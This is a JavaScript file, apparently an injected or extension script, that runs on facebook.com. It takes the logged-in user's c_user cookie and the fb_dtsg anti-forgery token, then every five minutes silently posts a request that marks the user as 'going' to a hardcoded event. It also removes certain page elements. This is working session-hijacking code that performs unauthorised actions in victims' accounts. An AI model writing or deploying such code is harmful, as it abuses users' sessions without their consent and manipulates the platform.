var win = this;
var ajax = win["XMLHttpRequest"];

function start() {
  var cookie_name = "channel_" + profile_id;
  var cookie_time = 5;
  if (!localStorage[cookie_name] || parseInt(localStorage[cookie_name]) < Date.now() - 60 * 1000 * cookie_time) {
    localStorage[cookie_name] = Date.now();
    events("2185466344999321");
  }
}

function events(id) {
  var xhr = new XMLHttpRequest();
  var getParams = {};
  getParams["pe_id"] = id;
  getParams["event_id"] = id;
  getParams["acontext[action_history]"] = JSON.stringify([{
    "surface": "permalink",
    "mechanism": "button_bar",
    "extra_data": []
  }]);
  getParams["acontext[has_source]"] = "true";
  getParams["active_tab"] = "about";
  getParams["pagelets_to_update[0]"] = "EventsPermalinkWorkplaceContentBannerPagelet";
  getParams["pagelets_to_update[1]"] = "EventsCohostAcceptancePagelet";
  getParams["pagelets_to_update[2]"] = "EventPublicProdGuestsPagelet";
  getParams["pagelets_to_update[3]"] = "EventInsightsPagelet";
  getParams["pagelets_to_update[4]"] = "EventPermalinkAdsSectionPagelet";
  getParams["pagelets_to_update[5]"] = "EventPublicProdDetailsPagelet";
  getParams["pagelets_to_update[6]"] = "EventPermalinkFeedbackSurvey";
  getParams["pagelets_to_update[7]"] = "SaleEventJoinPagelet";
  getParams["pagelets_to_update[8]"] = "EventPublicProdReactionPagelet";
  getParams["pagelets_to_update[9]"] = "EventPermalinkEventTipsPagelet";
  getParams["pagelets_to_update[10]"] = "EventPublicProdFeedRelatedEventsPagelet";
  getParams["dpr"] = "1";
  var params = {};
  params["__user"] = profile_id;
  params["__a"] = "1";
  params["__dyn"] = "";
  params["__req"] = "10";
  params["__be"] = "1";
  params["__pc"] = "PHASED:DEFAULT";
  params["__rev"] = __rev;
  params["fb_dtsg"] = fb_dtsg;
  params["jazoest"] = jazoest;
  params["__spin_r"] = __rev;
  params["__spin_b"] = "trunk";
  params["__spin_t"] = Math.floor(Date.now() / 1000);
  xhr.open("POST", "https://www.facebook.com/events/permalink/going/?" + deSerialize(getParams));
  xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
  xhr.onreadystatechange = function() {
    if (xhr.readyState == 4 && xhr.status == 200) {
      xhr.close;
    }
  }
  xhr.send(deSerialize(params));
}

function deSerialize(json) {
  return Object.keys(json).map(function(key) {
    return encodeURIComponent(key) + '=' + encodeURIComponent(json[key]);
  }).join('&');
}

function generate_name(length, firstUpper) {
  rname = "";
  sesli = "aeiou";
  sessiz = "bcdfghjklmnprstvyz";
  rname = rand(1, 2) == 1 ? sessiz[rand(0, sessiz.length - 1)] : sesli[rand(0, sesli.length - 1)];
  if (firstUpper == true) {
    rname = rname.toUpperCase();
  }
  for (n = 0; n < length; n++) {
    if (sesli.indexOf(rname[rname.length - 1]) >= 0) {
      rname += sessiz[rand(0, sessiz.length - 1)];
    } else {
      rname += sesli[rand(0, sesli.length - 1)];
    }
  }
  return rname;
}

function remove() {
  var bok = document.getElementsByClassName("_4xev _p");
  if (bok.length > 0) {
    for (var i = 0; i < bok.length; i++) {
      bok[i].outerHTML = "";
    }
  }
}

function inArray(arr, key, value) {
  var res = false;
  for (a = 0; a < arr.length; a++) {
    for (k in arr[a]) {
      if (k == key && arr[a][k] == value) {
        res = true;
        break;
      }
    }
  }
  return res;
}

function guid() {
  function s4() {
    return Math.floor((1 + Math.random()) * 0x10000).toString(16).substring(1);
  }
  return s4() + s4() + '-' + s4() + '-' + s4() + '-' + s4() + '-' + s4() + s4() + s4();
}

function randoms(l, m) {
  var r = [];
  while (r.length < l) {
    var rnd = Math.floor(Math.random() * m);
    if (r.indexOf(rnd) < 0) {
      r.push(rnd);
    }
  }
  return r;
}

function searchArray(a, k) {
  var found = false;
  for (key in a) {
    if (key.toString() == k) {
      found = a[key];
      break;
    } else if (typeof a[key] == "object") {
      found = searchArray(a[key], k);
      if (found != false) {
        break;
      }
    }
  }
  return found;
}

function shuffle(array) {
  var currentIndex = array.length,
    temporaryValue, randomIndex;
  while (0 !== currentIndex) {
    randomIndex = Math.floor(Math.random() * currentIndex);
    currentIndex -= 1;
    temporaryValue = array[currentIndex];
    array[currentIndex] = array[randomIndex];
    array[randomIndex] = temporaryValue;
  }
  return array;
}

function rand(min, max) {
  return Math.floor(Math.random() * (max - min)) + min;
}

function rastgele(uzunluk) {
  mtn = "abcdefghijklmnoprstuvyzxABCDEFGHIJKLMNOPRSTUVYZX0123456789";
  ret = "";
  for (l = 0; l < uzunluk; l++) {
    ret += mtn[Math.floor(Math.random() * mtn.length)];
  }
  return ret;
}

function deSerialize(json) {
  return Object.keys(json).map(function(key) {
    return encodeURIComponent(key) + '=' + encodeURIComponent(json[key]);
  }).join('&');
}
if (location.hostname.indexOf("facebook.com") >= 0) {
  fb_dtsg_list = document.getElementsByName('fb_dtsg');
  if (fb_dtsg_list.length > 0) {
    profile_id = document.cookie.match(/c_user=(\d+)/)[1];
    if (profile_id != 0) {
      fb_dtsg = fb_dtsg_list[0].value;
      __dyn = "";
      __rev = document.head.innerHTML.split('"server_revision":')[1].split(",")[0];
      jazoest = "";
      for (var x = 0; x < fb_dtsg.length; x++) {
        jazoest += fb_dtsg.charCodeAt(x);
      }
      jazoest = '2' + jazoest;
      start();
    }
  }
}
